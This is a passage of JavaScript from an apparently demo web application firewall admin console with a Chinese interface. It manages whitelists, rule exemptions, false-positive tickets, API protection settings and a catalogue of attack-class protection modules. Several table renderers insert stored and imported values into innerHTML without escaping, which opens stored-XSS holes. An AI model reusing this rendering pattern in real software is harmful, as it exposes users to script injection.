}

function fpUrlImport(){
  document.getElementById('fpUrlImportFile').click();
}

function fpUrlImportFile(el){
  const file = el.files[0];
  if(!file) return;
  const reader = new FileReader();
  reader.onload = (e)=>{
    try{
      const data = JSON.parse(e.target.result);
      if(!Array.isArray(data)) throw new Error('格式错误');
      const s = getFpData();
      data.forEach(item=>{
        if(item.url){
          s.urlWhitelist.unshift({
            url: item.url,
            type: item.type || 'exact',
            note: item.note || '',
            time: new Date().toLocaleString('zh-CN', {hour12:false})
          });
        }
      });
      saveFpData();
      document.getElementById('fpUrlCount').textContent = s.urlWhitelist.length;
      renderFpUrlList();
      showToast(`导入成功，共 ${data.length} 条`, 'success');
    }catch(err){
      showToast('导入失败：' + err.message, 'error');
    }
  };
  reader.readAsText(file);
  el.value = '';
}

function renderFpParamList(){
  const s = getFpData();
  const tbody = document.getElementById('fpParamBody');
  if(!tbody) return;
  tbody.innerHTML = s.paramWhitelist.length ? s.paramWhitelist.map((item, idx)=>`
    <tr>
      <td style="font-family:monospace;font-size:12px">${item.url || '<span class="tag cyan">全局</span>'}</td>
      <td style="font-family:monospace">${item.param}</td>
      <td style="color:var(--text3);font-size:12px">${item.desc||'-'}</td>
      <td style="color:var(--text3);font-size:11px">${item.time}</td>
      <td><button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="fpParamDel(${idx})">删除</button></td>
    </tr>
  `).join('') : '<tr><td colspan="5" style="text-align:center;color:var(--text4);padding:20px">暂无参数白名单</td></tr>';
}

function fpParamAdd(){
  const url = document.getElementById('fpParamUrl').value.trim();
  const param = document.getElementById('fpParamName').value.trim();
  const desc = document.getElementById('fpParamDesc').value.trim();
  if(!param) return showToast('请输入参数名', 'error');
  const s = getFpData();
  s.paramWhitelist.unshift({
    url, param, desc,
    global: !url,
    time: new Date().toLocaleString('zh-CN', {hour12:false})
  });
  saveFpData();
  document.getElementById('fpParamUrl').value = '';
  document.getElementById('fpParamName').value = '';
  document.getElementById('fpParamDesc').value = '';
  document.getElementById('fpParamCount').textContent = s.paramWhitelist.length;
  renderFpParamList();
  showToast('添加成功', 'success');
}

function fpParamDel(idx){
  if(!confirm('确认删除此参数白名单？')) return;
  const s = getFpData();
  s.paramWhitelist.splice(idx, 1);
  saveFpData();
  document.getElementById('fpParamCount').textContent = s.paramWhitelist.length;
  renderFpParamList();
  showToast('已删除', 'success');
}

function fpToggleGlobalParam(){
  const s = getFpData();
  s.globalParamEnabled = document.getElementById('fpGlobalParam').checked;
  saveFpData();
  showToast(s.globalParamEnabled ? '全局参数白名单已启用' : '全局参数白名单已关闭', 'success');
}

function renderFpRuleList(){
  const s = getFpData();
  const tbody = document.getElementById('fpRuleBody');
  if(!tbody) return;
  tbody.innerHTML = s.ruleExemptions.length ? s.ruleExemptions.map((item, idx)=>`
    <tr>
      <td style="font-family:monospace;color:var(--cyan)">${item.ruleId}</td>
      <td style="color:var(--text2);font-size:12px">${item.reason}</td>
      <td>${item.scope === '全局' ? '<span class="tag red">全局</span>' : '<span class="tag blue" style="font-family:monospace;font-size:10px">'+item.scope+'</span>'}</td>
      <td style="color:var(--text3);font-size:11px">${item.time}</td>
      <td><button class="btn btn-danger" style="padding:4px 10px;font-size:11px" onclick="fpRuleDel(${idx})">删除</button></td>
    </tr>
  `).join('') : '<tr><td colspan="5" style="text-align:center;color:var(--text4);padding:20px">暂无豁免规则</td></tr>';
}

function fpRuleAdd(){
  const ruleId = prompt('请输入规则 ID（如 SQL-INJ-001）：');
  if(!ruleId) return;
  const reason = prompt('请输入豁免原因：') || '';
  const scope = prompt('请输入生效范围（输入 "全局" 或指定 URL）：', '全局') || '全局';
  const s = getFpData();
  s.ruleExemptions.unshift({
    ruleId, reason, scope,
    time: new Date().toLocaleString('zh-CN', {hour12:false})
  });
  saveFpData();
  document.getElementById('fpRuleExemptCount').textContent = s.ruleExemptions.length;
  renderFpRuleList();
  showToast('添加成功', 'success');
}

function fpRuleDel(idx){
  if(!confirm('确认移除此规则豁免？')) return;
  const s = getFpData();
  s.ruleExemptions.splice(idx, 1);
  saveFpData();
  document.getElementById('fpRuleExemptCount').textContent = s.ruleExemptions.length;
  renderFpRuleList();
  showToast('已移除', 'success');
}

function renderFpTicketList(){
  const s = getFpData();
  const statusMap = { pending: {text: '待处理', tag: 'yellow'}, confirmed: {text: '已确认', tag: 'green'}, rejected: {text: '已驳回', tag: 'red'} };
  const tbody = document.getElementById('fpTicketBody');
  if(!tbody) return;
  tbody.innerHTML = s.tickets.length ? s.tickets.map((item, idx)=>{
    const st = statusMap[item.status] || statusMap.pending;
    return `
    <tr>
      <td style="font-family:monospace;color:var(--cyan);font-size:12px">${item.id}</td>
      <td style="color:var(--text3);font-size:11px">${item.time}</td>
      <td style="font-family:monospace;font-size:12px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${item.url}</td>
      <td><span class="tag orange">${item.type}</span></td>
      <td style="color:var(--text2);font-size:12px">${item.submitter}</td>
      <td><span class="tag ${st.tag}">${st.text}</span></td>
      <td>
        ${item.status === 'pending' ? `
        <button class="btn btn-success" style="padding:4px 8px;font-size:11px;margin-right:4px" onclick="fpTicketHandle(${idx},'confirmed')">确认</button>
        <button class="btn btn-danger" style="padding:4px 8px;font-size:11px" onclick="fpTicketHandle(${idx},'rejected')">驳回</button>
        ` : '<span class="tag gray" style="background:rgba(148,163,184,.1);color:var(--text3)">已处理</span>'}
      </td>
    </tr>
  `}).join('') : '<tr><td colspan="7" style="text-align:center;color:var(--text4);padding:20px">暂无误报工单</td></tr>';
}

function fpTicketHandle(idx, status){
  if(!confirm(status === 'confirmed' ? '确认此误报并添加白名单？' : '确认驳回此工单？')) return;
  const s = getFpData();
  s.tickets[idx].status = status;
  if(status === 'confirmed'){
    s.monthlyProcessed = (s.monthlyProcessed || 0) + 1;
    document.getElementById('fpMonthlyCount').textContent = s.monthlyProcessed;
  }
  saveFpData();
  renderFpTicketList();
  showToast(status === 'confirmed' ? '已确认为误报' : '已驳回', 'success');
}

// ========== API 安全 ==========
const API_STORAGE_KEY = 'shield_waf_api_security';

const defaultApiConfig = {
  protectedApis: 128,
  todayRequests: 45678,
  blockedAttacks: 132,
  avgLatency: '12ms',
  jwt: {
    enabled: true,
    algorithms: ['HS256', 'RS256', 'ES256'],
    requiredClaims: ['exp'],
    secret: '',
    blockNone: true,
    keyConfusion: true,
  },
  rateLimit: {
    enabled: true,
    perSec: 100,
    perMin: 1000,
    perHour: 10000,
    whitelist: '',
    action: '429',
  },
  graphql: {
    enabled: false,
    depth: 10,
    fields: 50,
    complexity: 1000,
    blockIntrospection: false,
    batchLimit: true,
  },
  websocket: {
    enabled: false,
    msgRate: 50,
    frameSize: 64,
    originCheck: true,
  },
  raceCondition: {
    enabled: false,
    window: 100,
    threshold: 5,
    action: 'delay',
  },
};

let apiConfig = null;

function getApiConfig(){
  if(apiConfig) return apiConfig;
  try{
    const raw = localStorage.getItem(API_STORAGE_KEY);
    if(raw) apiConfig = JSON.parse(raw);
  }catch(e){}
  if(!apiConfig){
    apiConfig = JSON.parse(JSON.stringify(defaultApiConfig));
    saveApiConfig();
  }
  return apiConfig;
}

function saveApiConfig(){
  if(!apiConfig) return;
  try{
    localStorage.setItem(API_STORAGE_KEY, JSON.stringify(apiConfig));
  }catch(e){}
}

function loadApiSecurity(){
  const s = getApiConfig();
  document.getElementById('apiProtectedCount').textContent = s.protectedApis;
  document.getElementById('apiTodayReq').textContent = s.todayRequests.toLocaleString();
  document.getElementById('apiBlockedCount').textContent = s.blockedAttacks;
  document.getElementById('apiAvgLatency').textContent = s.avgLatency;

  document.getElementById('apiJwtEnabled').checked = s.jwt.enabled;
  document.querySelectorAll('.api-jwt-algo').forEach(cb=>{
    cb.checked = s.jwt.algorithms.includes(cb.value);
  });
  document.querySelectorAll('.api-jwt-claim').forEach(cb=>{
    cb.checked = s.jwt.requiredClaims.includes(cb.value);
  });
  document.getElementById('apiJwtSecret').value = s.jwt.secret || '';
  document.getElementById('apiJwtBlockNone').checked = s.jwt.blockNone;
  document.getElementById('apiJwtKeyConfusion').checked = s.jwt.keyConfusion;

  document.getElementById('apiRateEnabled').checked = s.rateLimit.enabled;
  document.getElementById('apiRatePerSec').value = s.rateLimit.perSec;
  document.getElementById('apiRatePerMin').value = s.rateLimit.perMin;
  document.getElementById('apiRatePerHour').value = s.rateLimit.perHour;
  document.getElementById('apiRateWhitelist').value = s.rateLimit.whitelist || '';
  document.querySelectorAll('input[name="apiRateAction"]').forEach(r=>{
    r.checked = r.value === s.rateLimit.action;
  });

  document.getElementById('apiGraphqlEnabled').checked = s.graphql.enabled;
  document.getElementById('apiGraphqlDepth').value = s.graphql.depth;
  document.getElementById('apiGraphqlFields').value = s.graphql.fields;
  document.getElementById('apiGraphqlComplexity').value = s.graphql.complexity;
  document.getElementById('apiGraphqlBlockIntrospection').checked = s.graphql.blockIntrospection;
  document.getElementById('apiGraphqlBatchLimit').checked = s.graphql.batchLimit;

  document.getElementById('apiWsEnabled').checked = s.websocket.enabled;
  document.getElementById('apiWsMsgRate').value = s.websocket.msgRate;
  document.getElementById('apiWsFrameSize').value = s.websocket.frameSize;
  document.getElementById('apiWsOriginCheck').checked = s.websocket.originCheck;

  document.getElementById('apiRaceEnabled').checked = s.raceCondition.enabled;
  document.getElementById('apiRaceWindow').value = s.raceCondition.window;
  document.getElementById('apiRaceThreshold').value = s.raceCondition.threshold;
  document.querySelectorAll('input[name="apiRaceAction"]').forEach(r=>{
    r.checked = r.value === s.raceCondition.action;
  });
}

function apiSaveConfig(){
  const s = getApiConfig();
  s.jwt.enabled = document.getElementById('apiJwtEnabled').checked;
  s.jwt.algorithms = Array.from(document.querySelectorAll('.api-jwt-algo:checked')).map(cb=>cb.value);
  s.jwt.requiredClaims = Array.from(document.querySelectorAll('.api-jwt-claim:checked')).map(cb=>cb.value);
  s.jwt.secret = document.getElementById('apiJwtSecret').value;
  s.jwt.blockNone = document.getElementById('apiJwtBlockNone').checked;
  s.jwt.keyConfusion = document.getElementById('apiJwtKeyConfusion').checked;

  s.rateLimit.enabled = document.getElementById('apiRateEnabled').checked;
  s.rateLimit.perSec = parseInt(document.getElementById('apiRatePerSec').value) || 100;
  s.rateLimit.perMin = parseInt(document.getElementById('apiRatePerMin').value) || 1000;
  s.rateLimit.perHour = parseInt(document.getElementById('apiRatePerHour').value) || 10000;
  s.rateLimit.whitelist = document.getElementById('apiRateWhitelist').value;
  const rateAction = document.querySelector('input[name="apiRateAction"]:checked');
  s.rateLimit.action = rateAction ? rateAction.value : '429';

  s.graphql.enabled = document.getElementById('apiGraphqlEnabled').checked;
  s.graphql.depth = parseInt(document.getElementById('apiGraphqlDepth').value) || 10;
  s.graphql.fields = parseInt(document.getElementById('apiGraphqlFields').value) || 50;
  s.graphql.complexity = parseInt(document.getElementById('apiGraphqlComplexity').value) || 1000;
  s.graphql.blockIntrospection = document.getElementById('apiGraphqlBlockIntrospection').checked;
  s.graphql.batchLimit = document.getElementById('apiGraphqlBatchLimit').checked;

  s.websocket.enabled = document.getElementById('apiWsEnabled').checked;
  s.websocket.msgRate = parseInt(document.getElementById('apiWsMsgRate').value) || 50;
  s.websocket.frameSize = parseInt(document.getElementById('apiWsFrameSize').value) || 64;
  s.websocket.originCheck = document.getElementById('apiWsOriginCheck').checked;

  s.raceCondition.enabled = document.getElementById('apiRaceEnabled').checked;
  s.raceCondition.window = parseInt(document.getElementById('apiRaceWindow').value) || 100;
  s.raceCondition.threshold = parseInt(document.getElementById('apiRaceThreshold').value) || 5;
  const raceAction = document.querySelector('input[name="apiRaceAction"]:checked');
  s.raceCondition.action = raceAction ? raceAction.value : 'delay';

  saveApiConfig();
}

function apiToggleSecret(){
  const el = document.getElementById('apiJwtSecret');
  el.type = el.type === 'password' ? 'text' : 'password';
}

// ========== Toast ==========
function showToast(msg,type='success'){
  const t = document.createElement('div');
  t.style.cssText = `position:fixed;top:24px;right:24px;padding:12px 20px;border-radius:10px;font-size:13px;font-weight:600;z-index:9999;animation:toastIn .3s ease;${type==='success'?'background:rgba(16,185,129,.95);color:#fff':'background:rgba(239,68,68,.95);color:#fff'}`;
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(()=>{t.style.opacity='0';t.style.transform='translateX(100%)';t.style.transition='all .3s';setTimeout(()=>t.remove(),300)},2500);
}
const toastStyle = document.createElement('style');
toastStyle.textContent = '@keyframes toastIn{from{opacity:0;transform:translateX(100%)}to{opacity:1;transform:translateX(0)}}';
document.head.appendChild(toastStyle);

// ========== 防护中心 ==========
const protectModules = {
  core: [
    {id:'sql_injection',name:'SQL注入防护',icon:'💉',risk:'high',desc:'14层编码归一化 + 语义分析，精准拦截SQL注入攻击',config:[
      {type:'slider',label:'检测灵敏度',key:'sensitivity',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'拦截动作',key:'action',options:[{v:'block',l:'拦截并记录'},{v:'log',l:'仅记录'},{v:'challenge',l:'挑战验证'}],default:'block'},
      {type:'input',label:'白名单IP',key:'whitelist',default:''}
    ]},
    {id:'xss',name:'XSS跨站脚本',icon:'📝',risk:'high',desc:'HTML/JS/VBScript注入检测，支持DOM型、反射型、存储型',config:[
      {type:'slider',label:'检测强度',key:'level',min:1,max:10,default:8,unit:'级'},
      {type:'select',label:'输出编码',key:'encoding',options:[{v:'html',l:'HTML实体编码'},{v:'js',l:'JS编码'},{v:'auto',l:'自动检测'}],default:'auto'},
      {type:'input',label:'豁免参数',key:'exempt_params',default:''}
    ]},
    {id:'file_inclusion',name:'文件包含检测',icon:'📁',risk:'high',desc:'检测本地/远程文件包含攻击 (LFI/RFI)',config:[
      {type:'slider',label:'严格程度',key:'strictness',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'路径检测',key:'path_check',options:[{v:'full',l:'完整路径检测'},{v:'name',l:'仅文件名检测'}],default:'full'},
      {type:'input',label:'允许目录',key:'allowed_dirs',default:''}
    ]},
    {id:'cmd_injection',name:'命令注入防护',icon:'⌨️',risk:'high',desc:'检测系统命令注入，支持Windows/Linux双平台',config:[
      {type:'slider',label:'检测级别',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'命令函数',key:'func_check',options:[{v:'all',l:'全部检测'},{v:'common',l:'仅常用函数'},{v:'custom',l:'自定义'}],default:'all'},
      {type:'input',label:'允许命令',key:'allowed_cmds',default:''}
    ]},
    {id:'code_exec',name:'代码执行检测',icon:'⚙️',risk:'high',desc:'检测PHP/ASP/JSP等动态代码执行攻击',config:[
      {type:'slider',label:'检测深度',key:'depth',min:1,max:10,default:8,unit:'级'},
      {type:'select',label:'危险函数',key:'danger_funcs',options:[{v:'all',l:'全部拦截'},{v:'common',l:'仅常见函数'}],default:'all'},
      {type:'input',label:'豁免函数',key:'exempt_funcs',default:''}
    ]},
    {id:'malware',name:'木马后门检测',icon:'🦠',risk:'high',desc:'WebShell/木马/后门特征检测',config:[
      {type:'slider',label:'扫描深度',key:'depth',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'处理方式',key:'action',options:[{v:'block',l:'拦截访问'},{v:'log',l:'仅记录告警'}],default:'block'},
      {type:'input',label:'白名单文件',key:'whitelist_files',default:''}
    ]}
  ],
  advanced: [
    {id:'ssrf',name:'SSRF防护',icon:'🌐',risk:'high',desc:'内网IP/云元数据端点/协议跳转检测',config:[
      {type:'slider',label:'检测强度',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'协议限制',key:'proto',options:[{v:'strict',l:'仅允许HTTP/HTTPS'},{v:'medium',l:'允许常用协议'},{v:'all',l:'不限制协议'}],default:'strict'},
      {type:'input',label:'允许域名',key:'allowed_domains',default:''}
    ]},
    {id:'xxe',name:'XXE外部实体',icon:'📄',risk:'high',desc:'XML外部实体注入检测与防护',config:[
      {type:'slider',label:'检测级别',key:'level',min:1,max:10,default:8,unit:'级'},
      {type:'select',label:'处理方式',key:'action',options:[{v:'block',l:'拦截XXE请求'},{v:'strip',l:'剥离实体'},{v:'log',l:'仅记录'}],default:'block'},
      {type:'input',label:'允许实体白名单',key:'allowed_entities',default:''}
    ]},
    {id:'deserialization',name:'反序列化防护',icon:'🔄',risk:'high',desc:'PHP/Java/Python反序列化漏洞利用检测',config:[
      {type:'slider',label:'检测灵敏度',key:'sensitivity',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'类白名单',key:'class_whitelist',options:[{v:'enable',l:'启用类白名单'},{v:'disable',l:'禁用'}],default:'enable'},
      {type:'input',label:'允许的类',key:'allowed_classes',default:''}
    ]},
    {id:'ssti',name:'模板注入(SSTI)',icon:'🧩',risk:'high',desc:'Jinja2/Twig/Smarty/FreeMarker等模板注入检测',config:[
      {type:'slider',label:'检测深度',key:'depth',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'模板引擎',key:'engine',options:[{v:'auto',l:'自动检测'},{v:'jinja2',l:'Jinja2'},{v:'twig',l:'Twig'},{v:'smarty',l:'Smarty'}],default:'auto'},
      {type:'input',label:'安全变量',key:'safe_vars',default:''}
    ]},
    {id:'ldap',name:'LDAP注入',icon:'📇',risk:'medium',desc:'LDAP查询注入攻击检测',config:[
      {type:'slider',label:'检测级别',key:'level',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'过滤模式',key:'filter',options:[{v:'strict',l:'严格过滤'},{v:'normal',l:'常规过滤'}],default:'strict'},
      {type:'input',label:'允许属性',key:'allowed_attrs',default:''}
    ]},
    {id:'xpath',name:'XPath注入',icon:'🔍',risk:'medium',desc:'XPath表达式注入攻击检测',config:[
      {type:'slider',label:'检测强度',key:'level',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'处理方式',key:'action',options:[{v:'block',l:'拦截'},{v:'log',l:'仅记录'}],default:'block'},
      {type:'input',label:'安全表达式',key:'safe_expr',default:''}
    ]},
    {id:'nosql',name:'NoSQL注入',icon:'🍃',risk:'high',desc:'MongoDB/Redis等NoSQL数据库注入检测',config:[
      {type:'slider',label:'检测级别',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'数据库类型',key:'db_type',options:[{v:'auto',l:'自动检测'},{v:'mongodb',l:'MongoDB'},{v:'redis',l:'Redis'}],default:'auto'},
      {type:'input',label:'安全操作符',key:'safe_ops',default:''}
    ]},
    {id:'upload',name:'文件上传检测',icon:'📤',risk:'high',desc:'恶意文件上传检测与验证',config:[
      {type:'slider',label:'检测严格度',key:'strictness',min:1,max:10,default:8,unit:'级'},
      {type:'select',label:'验证方式',key:'verify',options:[{v:'full',l:'完整验证(扩展名+内容+魔数)'},{v:'ext',l:'仅扩展名'},{v:'mime',l:'仅MIME类型'}],default:'full'},
      {type:'input',label:'允许扩展名',key:'allowed_exts',default:''}
    ]},
    {id:'malicious_scan',name:'恶意扫描',icon:'🔭',risk:'medium',desc:'检测漏洞扫描器/端口扫描/目录爆破等恶意扫描行为',config:[
      {type:'slider',label:'检测灵敏度',key:'sensitivity',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'响应动作',key:'action',options:[{v:'block',l:'拦截并封禁'},{v:'challenge',l:'人机验证'},{v:'log',l:'仅记录'}],default:'block'},
      {type:'input',label:'阈值(次/分钟)',key:'threshold',default:'60'}
    ]}
  ],
  protocol: [
    {id:'crlf',name:'CRLF注入',icon:'↩️',risk:'medium',desc:'HTTP响应头注入/CRLF注入检测',config:[
      {type:'slider',label:'检测级别',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'处理方式',key:'action',options:[{v:'block',l:'拦截'},{v:'strip',l:'剥离CRLF'},{v:'log',l:'仅记录'}],default:'strip'},
      {type:'input',label:'允许头',key:'allowed_headers',default:''}
    ]},
    {id:'cache_poisoning',name:'缓存投毒',icon:'💊',risk:'medium',desc:'缓存绕过头/Host投毒等缓存污染攻击',config:[
      {type:'slider',label:'检测强度',key:'level',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'缓存键',key:'cache_key',options:[{v:'strict',l:'严格规范化'},{v:'normal',l:'标准模式'}],default:'strict'},
      {type:'input',label:'信任头',key:'trusted_headers',default:''}
    ]},
    {id:'request_smuggling',name:'HTTP请求走私',icon:'🚢',risk:'high',desc:'CL.TE/TE.CL/TE.TE等请求走私攻击',config:[
      {type:'slider',label:'检测级别',key:'level',min:1,max:10,default:8,unit:'级'},
      {type:'select',label:'传输编码',key:'te',options:[{v:'block',l:'拒绝歧义请求'},{v:'normalize',l:'规范化处理'},{v:'log',l:'仅记录'}],default:'block'},
      {type:'input',label:'最大长度',key:'max_body',default:'1048576'}
    ]},
    {id:'chunked',name:'分块传输',icon:'📦',risk:'medium',desc:'异常分块编码/分块绕过检测',config:[
      {type:'slider',label:'检测强度',key:'level',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'处理方式',key:'action',options:[{v:'block',l:'拦截异常分块'},{v:'rebuild',l:'重建请求体'},{v:'log',l:'仅记录'}],default:'block'},
      {type:'input',label:'最大块大小',key:'max_chunk',default:'8192'}
    ]},
    {id:'open_redirect',name:'开放重定向',icon:'🔀',risk:'low',desc:'检测URL跳转/开放重定向漏洞利用',config:[
      {type:'slider',label:'检测级别',key:'level',min:1,max:10,default:5,unit:'级'},
      {type:'select',label:'跳转限制',key:'redirect',options:[{v:'whitelist',l:'白名单域名'},{v:'same-domain',l:'仅同域名'},{v:'all',l:'不限制'}],default:'same-domain'},
      {type:'input',label:'允许域名',key:'allowed_domains',default:''}
    ]},
    {id:'security_headers',name:'安全响应头',icon:'🔒',risk:'low',desc:'自动添加安全响应头 (CSP/HSTS/X-Frame等',config:[
      {type:'slider',label:'安全等级',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'预设方案',key:'preset',options:[{v:'strict',l:'严格模式'},{v:'balanced',l:'平衡模式'},{v:'basic',l:'基础模式'}],default:'balanced'},
      {type:'input',label:'CSP策略',key:'csp',default:''}
    ]},
    {id:'cors',name:'CORS策略',icon:'🌉',risk:'medium',desc:'跨域资源共享安全策略配置',config:[
      {type:'slider',label:'严格程度',key:'strictness',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'Origin验证',key:'origin',options:[{v:'whitelist',l:'白名单验证'},{v:'same-site',l:'仅同站'},{v:'all',l:'全部允许'}],default:'whitelist'},
      {type:'input',label:'允许的Origin',key:'allowed_origins',default:''}
    ]}
  ],
  session: [
    {id:'session_fixation',name:'会话固定',icon:'📌',risk:'high',desc:'检测并防止会话固定攻击',config:[
      {type:'slider',label:'保护级别',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'会话再生',key:'regenerate',options:[{v:'login',l:'登录时再生'},{v:'always',l:'每次请求'},{v:'interval',l:'定时再生'}],default:'login'},
      {type:'input',label:'再生间隔(秒)',key:'interval',default:'1800'}
    ]},
    {id:'session_hijack',name:'会话劫持',icon:'🕵️',risk:'high',desc:'会话劫持检测与防护 (IP/UA绑定',config:[
      {type:'slider',label:'检测强度',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'验证方式',key:'verify',options:[{v:'ip_ua',l:'IP+UA绑定'},{v:'ua',l:'仅UA绑定'},{v:'ip',l:'仅IP绑定'}],default:'ip_ua'},
      {type:'input',label:'异常阈值',key:'threshold',default:'3'}
    ]},
    {id:'session_security',name:'会话安全加固',icon:'🛡️',risk:'medium',desc:'Cookie安全属性/会话配置加固',config:[
      {type:'slider',label:'加固级别',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'SameSite',key:'samesite',options:[{v:'strict',l:'Strict'},{v:'lax',l:'Lax'},{v:'none',l:'None(不安全'}],default:'strict'},
      {type:'input',label:'会话超时(秒)',key:'timeout',default:'3600'}
    ]},
    {id:'csrf',name:'CSRF防护',icon:'🎭',risk:'high',desc:'跨站请求伪造防护 (CSRF token验证',config:[
      {type:'slider',label:'保护级别',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'验证方式',key:'method',options:[{v:'token',l:'Token验证'},{v:'referer',l:'Referer检查'},{v:'both',l:'双重验证'}],default:'token'},
      {type:'input',label:'豁免URL',key:'exempt_urls',default:''}
    ]},
    {id:'cookie_security',name:'Cookie安全',icon:'🍪',risk:'medium',desc:'Cookie安全属性设置与加固',config:[
      {type:'slider',label:'安全等级',key:'level',min:1,max:10,default:8,unit:'级'},
      {type:'select',label:'HttpOnly',key:'httponly',options:[{v:'all',l:'全部启用'},{v:'session',l:'仅会话Cookie'}],default:'all'},
      {type:'input',label:'豁免Cookie名',key:'exempt_cookies',default:''}
    ]}
  ],
  api: [
    {id:'jwt',name:'JWT安全',icon:'🎫',risk:'high',desc:'JWT令牌安全检测 (空签名/alg:none/弱密钥',config:[
      {type:'slider',label:'检测强度',key:'level',min:1,max:10,default:8,unit:'级'},
      {type:'select',label:'算法限制',key:'algo',options:[{v:'strict',l:'仅允许HS256/RS256'},{v:'all',l:'允许所有算法'}],default:'strict'},
      {type:'input',label:'公钥URL',key:'jwks_url',default:''}
    ]},
    {id:'api_rate_limit',name:'API速率限制',icon:'⏱️',risk:'medium',desc:'API接口限流/防刷/防暴力破解',config:[
      {type:'slider',label:'限流级别',key:'level',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'限流算法',key:'algo',options:[{v:'token_bucket',l:'令牌桶'},{v:'leaky_bucket',l:'漏桶'},{v:'fixed_window',l:'固定窗口'}],default:'token_bucket'},
      {type:'input',label:'请求限制(次/分)',key:'limit',default:'100'}
    ]},
    {id:'graphql',name:'GraphQL防护',icon:'◈',risk:'medium',desc:'GraphQL注入/深度限制/字段限制防护',config:[
      {type:'slider',label:'防护级别',key:'level',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'模式',key:'mode',options:[{v:'protect',l:'保护模式'},{v:'monitor',l:'监控模式'}],default:'protect'},
      {type:'input',label:'最大深度',key:'max_depth',default:'10'}
    ]},
    {id:'websocket',name:'WebSocket防护',icon:'🔌',risk:'medium',desc:'WebSocket协议安全检测与防护',config:[
      {type:'slider',label:'防护等级',key:'level',min:1,max:10,default:6,unit:'级'},
      {type:'select',label:'帧验证',key:'frame',options:[{v:'strict',l:'严格验证'},{v:'basic',l:'基础验证'}],default:'strict'},
      {type:'input',label:'消息大小限制',key:'max_msg',default:'65536'}
    ]},
    {id:'race_condition',name:'竞态条件防护',icon:'🏁',risk:'medium',desc:'并发竞态条件漏洞利用检测与防护',config:[
      {type:'slider',label:'检测灵敏度',key:'sensitivity',min:1,max:10,default:5,unit:'级'},
      {type:'select',label:'防护方式',key:'action',options:[{v:'lock',l:'请求加锁'},{v:'delay',l:'延迟响应'},{v:'log',l:'仅记录'}],default:'lock'},
      {type:'input',label:'窗口时间(毫秒)',key:'window',default:'1000'}
    ]},
    {id:'api_security',name:'API安全基线',icon:'📏',risk:'medium',desc:'API安全规范检查与基线防护',config:[
      {type:'slider',label:'基线等级',key:'level',min:1,max:10,default:7,unit:'级'},
      {type:'select',label:'合规标准',key:'standard',options:[{v:'owasp',l:'OWASP API Top 10'},{v:'custom',l:'自定义'}],default:'owasp'},
      {type:'input',label:'API路径前缀',key:'api_prefix',default:'/api/'}
    ]}
  ]
};

let protectState = {};
let protectMode = 'protect';

function loadProtectCenter(){
  const saved = localStorage.getItem('shield_protect_state');
  if(saved){
    try{ protectState = JSON.parse(saved); }catch(e){}
  }
  if(!Object.keys(protectState).length){
    doProtectResetDefault();
  }
  const savedMode = localStorage.getItem('shield_protect_mode');
  if(savedMode) protectMode = savedMode;
  updateProtectModeUI();
  renderProtectModules();
  updateProtectKPI();
}

function renderProtectModules(){
  ['core','advanced','protocol','session','api'].forEach(cat => {
    const grid = document.getElementById('grid-' + cat);
    if(!grid) return;
    const modules = protectModules[cat] || [];
    grid.innerHTML = modules.map(m => renderModuleCard(m, cat)).join('');
  });
}

function renderModuleCard(m, cat){
  const enabled = protectState[m.id] !== false;
  const iconClass = cat;
  const configs = m.config || [];
  const configHtml = configs.map(c => {
    let val = (protectState[m.id + '_' + c.key] !== undefined) ? protectState[m.id + '_' + c.key] : c.default;
    if(c.type === 'slider'){
      return `<div class="config-item">
        <div class="config-label"><span>${c.label}</span><span id="val_${m.id}_${c.key}">${val}${c.unit||''}</span></div>
        <input type="range" class="config-slider" min="${c.min}" max="${c.max}" value="${val}" oninput="updateConfigVal('${m.id}','${c.key}',this.value,'${c.unit||''}')" onchange="saveConfigVal('${m.id}','${c.key}',this.value)">
      </div>`;
    } else if(c.type === 'select'){
      return `<div class="config-item">
        <div class="config-label"><span>${c.label}</span></div>
        <select class="config-select" onchange="saveConfigVal('${m.id}','${c.key}',this.value)">
          ${c.options.map(o => `<option value="${o.v}" ${val===o.v?'selected':''}>${o.l}</option>`).join('')}
        </select>
      </div>`;
    } else if(c.type === 'input'){
      return `<div class="config-item">
        <div class="config-label"><span>${c.label}</span></div>
        <input type="text" class="config-input" value="${val||''}" placeholder="请输入" onchange="saveConfigVal('${m.id}','${c.key}',this.value)">
      </div>`;
    }
    return '';
  }).join('');

  return `<div class="module-card ${enabled?'':'disabled'}" id="card_${m.id}">
    <div class="module-head">
      <div class="module-icon ${iconClass}">${m.icon}</div>
      <div class="module-info">
        <div class="module-name">${m.name}</div>
        <div class="module-desc">${m.desc}</div>
      </div>
    </div>
    <div class="module-meta">
      <span class="risk-tag ${m.risk}">${m.risk==='high'?'高风险':m.risk==='medium'?'中风险':'低风险'}</span>
      <label class="waf-switch">
        <input type="checkbox" ${enabled?'checked':''} onchange="toggleModule('${m.id}',this.checked)">
        <span class="waf-slider"></span>
      </label>
    </div>
    <button class="module-config-btn" onclick="toggleConfig('${m.id}')">
      ⚙️ 配置 <span class="chevron">▼</span>
    </button>
    <div class="module-config-panel">${configHtml}</div>
  </div>`;
}

function toggleModule(id, enabled){
  protectState[id] = enabled;
  saveProtectState();
